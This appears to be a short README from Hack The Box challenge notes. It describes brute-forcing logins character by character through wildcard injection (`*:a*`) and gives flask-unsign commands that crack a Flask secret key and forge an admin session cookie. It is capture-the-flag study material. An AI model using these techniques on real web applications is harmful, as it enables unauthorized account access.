# Bruteforce

These scripts were used in [Hack The Box](https://www.hackthebox.com/) challenges:

## [`bruteforce_usernames.py`](bruteforce_usernames.py)

I had to find the correct username/password for users so we wrote a script that bruteforce single characters for one of the fileds in the Post
the login was successfull entering `*:*` so trying `*:a*` could make us find a correct password...
> [`source`](https://fergustran1008.medium.com/writeup-phonebook-webchallenge-htb-87772510a853)

---

## [`flask-unsign`](https://pypi.org/project/flask-unsign/)

Flask Unsign is a penetration testing utility that attempts to uncover a Flask server's secret key by taking a signed session verifying it against a wordlist of commonly used and publicly known secret keys
it needs to be used against cookie like these (pay attentions to the dots):
`eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicGV0ZXIifQ.Yv6pSg.hH1pYHVIYni0c0kaxQy2ftP239U`

> install:
`sudo pip3 install flask-unsign`
`sudo pip3 install flask-unsign[wordlist]`

> usage unsign:
`flask-unsign --unsign --cookie 'snap'`

> usage sign:
`flask-unsign --sign --cookie "{'logged_in': True, 'username' :'admin'}" --secret secret123`
